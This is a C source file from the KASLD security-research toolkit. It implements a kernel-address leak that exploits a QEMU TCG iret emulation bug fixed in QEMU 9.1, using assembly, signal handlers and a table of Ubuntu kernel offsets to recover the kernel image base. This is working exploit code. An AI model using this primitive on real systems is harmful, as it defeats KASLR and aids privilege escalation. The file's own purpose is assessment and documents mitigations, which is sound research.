// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak a kernel text address inside a QEMU (<9.1) guest (x86-64) using `iret`.
//
// The QEMU TCG (Tiny Code Generator) implementation performs the stack reads
// of the iret and call-far (retf) instructions as if the current privilege
// level were 0 (a supervisor access), rather than using the executing ring's
// CPL. A ring-3 program can therefore point rsp at a kernel address and have
// iret read the return frame from it — an access that should fault — pulling a
// kernel value out into the guest. The div-by-zero always faults through
// vector 0, so the value recovered is the return address of the divide-error
// handler left on the kernel stack: asm_exc_divide_error+0xf, a kernel .text
// pointer at a build-specific offset above _text (tens of MiB).
//
// Patched in QEMU version 9.1.
//
// The leak primitive (the div/sgdt/iretq sequence and signal handlers)
// is used largely verbatim from original code by @_leave07 and @prosti:
// https://kqx.io/post/qemu-nday/#leak-exploit
//
// Output (on a recognized build the image base is also recovered):
// [.] trying QEMU TCG iret leak ...
// [+] leaked kernel text address: ffffffff886010af   (asm_exc_divide_error+0xf)
// [.] image base at or below: ffffffff88600000
// [+] recovered image base: ffffffff87600000
// V kernel_text:asm_exc_divide_error pos=interior conf=parsed
// sample=0xffffffff886010af V kernel_image:_text pos=base conf=heuristic
// lo=0xffffffff87600000
//
// Leak primitive:
//   Data leaked:      kernel .text address (asm_exc_divide_error+0xf return
//   site) Kernel subsystem: QEMU TCG — iret instruction emulation bug Data
//   structure:   return-address slot in the kernel exception stack frame
//   Address type:     virtual (kernel text)
//   Method:           parsed (QEMU reads the iret frame as ring 0)
//   Patched:          QEMU v9.1 (commit 0bd385e7)
//   Status:           fixed in QEMU v9.1 (not a kernel bug)
//   Access check:     N/A (QEMU TCG emulation bug; not a kernel vulnerability)
//   Source:           N/A (QEMU bug, not kernel source)
//
// Mitigations:
//   Fixed in QEMU v9.1. Only affects QEMU TCG (software emulation);
//   KVM (hardware virtualization) is not affected. Not a kernel bug.
//   The exception stack is located via `sgdt`; when the guest CPU exposes
//   UMIP the kernel emulates `sgdt` with a dummy GDT base, so the leak cannot
//   find the frame even on a vulnerable QEMU. That case is detected up front
//   and reported UNAVAILABLE (mitigation: umip) before the faulting iret runs.
//   KPTI does NOT block this leak: the exception stack lives in the
//   cpu_entry_area, which is mapped in the user page tables even under KPTI.
//
// References:
// https://kqx.io/post/qemu-nday/#leak-exploit
// https://bugs.launchpad.net/qemu/+bug/1866892
// https://gitlab.com/qemu-project/qemu/-/commit/0bd385e7e3c33e987d7a8879918be6df7b111ac4
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported (x86-64 only)"
#endif

#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/utsname.h>

KASLD_EXPLAIN(
    "Inside a QEMU TCG (software-emulated) x86_64 guest, the iret "
    "instruction performs its stack reads as ring 0 instead of the "
    "executing ring's privilege level. A ring-3 program points rsp at the "
    "kernel exception stack, and iret reads back an exception handler's "
    "return address — a kernel .text pointer — which faults on use and is "
    "kept as a text sample. Fixed in QEMU v9.1.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "live:1\n"
           "addr:virtual\n"
           "patch:QEMU v9.1\n");

/* UMIP (User-Mode Instruction Prevention) emulation dummy GDT base. When UMIP
 * is active the kernel traps `sgdt` from ring 3 and returns this hardcoded base
 * (arch/x86/kernel/umip.c: UMIP_DUMMY_GDT_BASE) instead of the real GDTR — so
 * the exception stack cannot be located and the technique cannot work. UMIP is
 * present on Intel Cannon Lake+ (2018) and AMD Zen 2+ (2019). */
#define UMIP_DUMMY_GDT_BASE 0xfffffffffffe0000UL

/* True when `sgdt` is being emulated by the kernel under UMIP (dummy base). */
static int umip_active(void) {
  struct {
    uint16_t limit;
    uint64_t base;
  } __attribute__((packed)) gdtr;
  __asm__ volatile("sgdt %0" : "=m"(gdtr));
  return (unsigned long)gdtr.base == UMIP_DUMMY_GDT_BASE;
}

/* Offset of asm_exc_divide_error from the kernel image base (_text) for known
 * builds — i.e. (asm_exc_divide_error - _text), read from System.map/kallsyms.
 * The leak returns asm_exc_divide_error+<small>, so the exact image base is
 * floor(leaked - asm_exc_divide_error): flooring to the KASLR grid absorbs the
 * sub-alignment return-site remainder. Keyed on the full uname
 * ("<release> <version>") as a build fingerprint — the version string embeds
 * the build id/date, so a match identifies the precise build and a bad guess
 * simply never matches. Long Ubuntu HWE versions overflow utsname.version's
 * 64-char field, so the kernel clips them at build (in /proc/version and uname
 * -v alike); fingerprints are stored exactly as the kernel reports them, with
 * trailing whitespace trimmed on both sides so a clip that ends on a space
 * still matches. A match only sets the likely window (CONF_HEURISTIC); the
 * guaranteed window rests on the interior sample. */
struct kernel_info {
  const char *kernel_version;
  uint64_t asm_exc_divide_error;
};

// clang-format off
static const struct kernel_info offsets[] = {
    // Ubuntu 20.04 (5.8 HWE)
    {"5.8.0-23-generic #24~20.04.1-Ubuntu SMP Sat Oct 10 04:57:02 UTC 2020",           0xc00870},
    {"5.8.0-25-generic #26~20.04.1-Ubuntu SMP Thu Oct 15 14:55:06 UTC 2020",           0xc00870},
    {"5.8.0-28-generic #30~20.04.1-Ubuntu SMP Thu Nov 5 20:57:40 UTC 2020",            0xc00870},
    {"5.8.0-29-generic #31~20.04.1-Ubuntu SMP Fri Nov 6 16:10:42 UTC 2020",            0xc00870},
    {"5.8.0-33-generic #36~20.04.1-Ubuntu SMP Wed Dec 9 17:01:13 UTC 2020",            0xc00870},
    {"5.8.0-34-generic #37~20.04.2-Ubuntu SMP Thu Dec 17 14:53:00 UTC 2020",           0xc00870},
    {"5.8.0-36-generic #40~20.04.1-Ubuntu SMP Wed Jan 6 10:15:55 UTC 2021",            0xc00870},
    {"5.8.0-38-generic #43~20.04.1-Ubuntu SMP Tue Jan 12 16:39:47 UTC 2021",           0xc00870},
    {"5.8.0-40-generic #45~20.04.1-Ubuntu SMP Fri Jan 15 11:35:04 UTC 2021",           0xc00870},
    {"5.8.0-41-generic #46~20.04.1-Ubuntu SMP Mon Jan 18 17:52:23 UTC 2021",           0xc00870},
    {"5.8.0-43-generic #49~20.04.1-Ubuntu SMP Fri Feb 5 09:57:56 UTC 2021",            0xc00870},
    {"5.8.0-44-generic #50~20.04.1-Ubuntu SMP Wed Feb 10 21:07:30 UTC 2021",           0xc00870},
    {"5.8.0-45-generic #51~20.04.1-Ubuntu SMP Tue Feb 23 13:46:31 UTC 2021",           0xc00870},
    {"5.8.0-48-generic #54~20.04.1-Ubuntu SMP Sat Mar 20 13:40:25 UTC 2021",           0xc00870},
    {"5.8.0-49-generic #55~20.04.1-Ubuntu SMP Fri Mar 26 01:01:07 UTC 2021",           0xc00870},
    {"5.8.0-50-generic #56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021",           0xc00870},
    {"5.8.0-53-generic #60~20.04.1-Ubuntu SMP Thu May 6 09:52:46 UTC 2021",            0xc00870},
    {"5.8.0-53-lowlatency #60~20.04.1-Ubuntu SMP PREEMPT Thu May 6 10:59:47 UTC 2021", 0xc00870},
    {"5.8.0-55-generic #62~20.04.1-Ubuntu SMP Wed Jun 2 08:55:04 UTC 2021",            0xc00870},
    // Ubuntu 21.04
    {"5.11.0-16-generic #17-Ubuntu SMP Wed Apr 14 20:12:43 UTC 2021",                  0xe00870},
    {"5.11.0-22-generic #23-Ubuntu SMP Thu Jun 17 00:34:23 UTC 2021",                  0xe00870},
    // Ubuntu 21.10
    {"5.13.0-27-generic #29-Ubuntu SMP Wed Jan 12 17:36:47 UTC 2022",                  0xe00860},
    {"5.13.0-30-generic #33-Ubuntu SMP Fri Feb 4 17:03:31 UTC 2022",                   0xe00860},
    {"5.13.0-35-generic #40-Ubuntu SMP Mon Mar 7 08:03:10 UTC 2022",                   0xe00860},
    {"5.13.0-37-generic #42-Ubuntu SMP Tue Mar 15 14:34:06 UTC 2022",                  0xe00860},
    {"5.13.0-37-lowlatency #42-Ubuntu SMP PREEMPT Tue Mar 15 15:24:39 UTC 2022",       0xe00860},
    // Ubuntu 22.04
    {"5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022",                  0xe008f0},
    // Ubuntu 24.04
    {"6.8.0-134-generic #134-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 26 18:43:11 UTC 2026", 0x1400950},
    {"6.8.0-136-generic #136-Ubuntu SMP PREEMPT_DYNAMIC Wed Jul  1 21:53:05 UTC 2026", 0x1400950},
};
// clang-format on

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

/* Index into offsets[] whose full uname matches this kernel, or -1. The
 * fingerprint (compose + trailing-space trim) is built by
 * kasld_uname_fingerprint(); see its comment for why the trim matters. */
static int match_known_kernel(void) {
  struct utsname u;
  char v[512];
  unsigned long i;

  if (kasld_uname(&u) != 0)
    return -1;
  kasld_uname_fingerprint(v, sizeof(v), &u);
  for (i = 0; i < ARRAY_SIZE(offsets); i++)
    if (strcmp(v, offsets[i].kernel_version) == 0)
      return (int)i;
  return -1;
}

uint64_t kbase;
static sigjmp_buf env;

// SIGFPE handler: triggered by the intentional div-by-zero in kaslr().
// Advances RIP past the 3-byte `div rax` instruction so execution
// continues with the sgdt/iretq sequence.
static void sigfpe_handler(int sig, siginfo_t *si, void *context) {
  (void)sig;
  (void)si;
  ucontext_t *uc = (ucontext_t *)context;

  uc->uc_mcontext.gregs[REG_RIP] += 3;
}

// SIGSEGV handler: when the leak fires, the mis-emulated iretq has popped an
// exception handler's return address off the kernel exception stack into RIP
// and faulted trying to execute it from ring 3 (SMEP). RIP here is therefore a
// kernel .text address — the handler's return address, read off the kernel
// stack. (If the read instead faults, or lands on a non-text value, main()
// discards it.)
static void sigsegv_handler(int sig, siginfo_t *si, void *context) {
  (void)sig;
  (void)si;
  ucontext_t *uc = (ucontext_t *)context;

  kbase = (uint64_t)uc->uc_mcontext.gregs[REG_RIP];

  siglongjmp(env, 1);
}

static void kaslr(void) {
  __asm__ volatile(
      ".intel_syntax noprefix\n"

      // Step 1: Load a recognizable landmark frame into registers R15-R12.
      // When the div-by-zero fault fires, these callee-saved regs are
      // pushed onto the kernel exception stack as pt_regs, marking a known
      // spot below the handler's return address: {RIP=0x133a000, CS=0x33,
      // RFLAGS=0x206, RSP=unused, SS=0x2b}.
      "mov r15, 0x33\n"      // CS: user-mode code segment
      "mov r14, 0x206\n"     // RFLAGS: IF set
      "mov r13, 0x133a000\n" // RIP: target address (unmapped)
      "mov r12, 0x2b\n"      // SS: user-mode stack segment

      // Step 2: Trigger a divide-by-zero exception.
      // The SIGFPE handler advances RIP past this instruction.
      // The fault pushes R15-R12 (the fake iret frame) onto the
      // kernel exception stack.
      "mov rax, 0\n"
      "div rax\n"

      // Step 3: Use `sgdt` (executable from ring 3) to leak the
      // GDT base address, then compute the address on the kernel
      // exception stack where the fault handler's return address
      // (a kernel .text pointer) sits just above our fake iret frame.
      "push rax\n"
      "sgdt [rsp]\n"
      "mov rax, qword [rsp+2-8]\n" // GDT base address
      "add rax, 0x1f50\n"          // offset to iret frame on exception stack
      "mov rsp, rax\n"

      // Step 4: Execute iretq. Due to the QEMU bug, iretq in ring 3 reads
      // the frame from where RSP now points (the kernel exception stack) as
      // a ring-0 access instead of faulting. It pops the exception handler's
      // return address — sitting just above our landmark frame — into RIP,
      // then faults trying to execute that kernel .text address from ring 3.
      // The SIGSEGV handler captures it from the signal context.
      "iretq\n"
      ".att_syntax noprefix\n");
}

static uint64_t get_kernel_text_addr_using_qemu_tcg_iret(void) {
  kasld_info("trying QEMU TCG iret leak ...");

  // Install SIGFPE handler to recover from the intentional div-by-zero
  struct sigaction sa_fpe = {0};
  sa_fpe.sa_sigaction = sigfpe_handler;
  sa_fpe.sa_flags = SA_SIGINFO;
  sigaction(SIGFPE, &sa_fpe, NULL);

  // Set up an alternate signal stack so the SIGSEGV handler can run even
  // when RSP has been corrupted to a kernel address (which happens whenever
  // the leak does not fire — patched QEMU, or the frame read itself faults —
  // so iretq faults before restoring a valid RSP). The alt stack is
  // load-bearing for this technique — without it, that faulting iretq drops
  // the handler onto the corrupted main stack and the component segfaults
  // instead of cleanly reporting "no leak". Bail rather than continue with the
  // safeguard silently disabled.
  stack_t ss;
  ss.ss_sp = malloc(SIGSTKSZ);
  if (!ss.ss_sp) {
    /* This returns a leaked address (0 = none); the safeguard cannot be armed,
     * so report no leak rather than letting an exit-code value escape as an
     * address. */
    kasld_err("alt-stack alloc failed; aborting");
    return 0;
  }
  ss.ss_size = SIGSTKSZ;
  ss.ss_flags = 0;
  sigaltstack(&ss, NULL);

  // Install SIGSEGV handler to capture the leaked kernel address
  struct sigaction sa_segv = {0};
  sa_segv.sa_sigaction = sigsegv_handler;
  sa_segv.sa_flags = SA_SIGINFO | SA_ONSTACK;
  sigemptyset(&sa_segv.sa_mask);
  sigaction(SIGSEGV, &sa_segv, NULL);

  // Pre-map a stack region just below 0x133a000 (the landmark RIP). Used as
  // a fallback stack for the path where iretq pops the landmark frame and
  // jumps to 0x133a000 instead of leaking; this growsdown mapping at
  // 0x1338000 is adjacent to that target.
  mmap((void *)0x1338000, PAGE_SIZE * 2, PROT_READ | PROT_WRITE,
       MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_POPULATE,
       -1, 0);

  if (sigsetjmp(env, 1) == 0) {
    kaslr();
  }

  if (kasld_addr_is_kernel_text(kbase)) {
    kasld_found("leaked kernel text address: %lx", kbase);
    return kbase;
  }

  return 0;
}

int main(void) {
  if (kasld_skip_live_probe("iret"))
    return 0;

  // UMIP emulates `sgdt` with a dummy GDT base, so the exception stack cannot
  // be located. Detect it up front and bail before the faulting iret — on a
  // UMIP host that iret reads unmapped memory and logs a spurious kernel
  // page-fault Oops. UMIP is a defensive control that is present, so report it
  // as a mitigation (exit UNAVAILABLE). KPTI, by contrast, does not block this
  // leak: the exception stack lives in the cpu_entry_area, which stays mapped
  // in the user page tables even under KPTI.
  if (umip_active())
    return kasld_disp_mitigation(
        "umip", "UMIP emulates sgdt; kernel exception stack not locatable");

  unsigned long addr = get_kernel_text_addr_using_qemu_tcg_iret();

  if (!addr) {
    kasld_err("QEMU TCG IRET fault not triggered");
    return 0;
  }

  // The leak is an interior .text pointer, not the image base: the div-by-zero
  // always faults through vector 0, so `addr` is the return address inside
  // asm_exc_divide_error (the #DE entry stub), observed at +0xf. Its distance
  // from _text is build-specific (tens of MiB), so the sample is named for
  // provenance but the engine bounds the base from it — the base is
  // grid-aligned at or below the floored sample.
  kasld_info("image base at or below: %lx", kasld_floor_text_base(addr));
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, addr,
                      "asm_exc_divide_error", CONF_PARSED);

  // If the exact build is known, subtract asm_exc_divide_error's offset from
  // _text to recover the image base. Flooring to the KASLR grid absorbs the
  // sub-alignment return-site remainder, so the result is _text exactly. Report
  // it at CONF_HEURISTIC — the recovery trusts the uname build fingerprint, not
  // proof, so it pins only the likely window; the CONF_PARSED sample above
  // still bounds the guaranteed window soundly if the table is ever stale.
  int k = match_known_kernel();
  if (k >= 0) {
    unsigned long base =
        kasld_floor_text_base(addr - offsets[k].asm_exc_divide_error);
    if (kasld_addr_is_kernel_text(base) && addr >= base) {
      kasld_found("recovered image base: %lx", base);
      kasld_result_base(KASLD_TYPE_VIRT, REGION_KERNEL_IMAGE, base, "_text",
                        CONF_HEURISTIC);
    }
  }

  return 0;
}
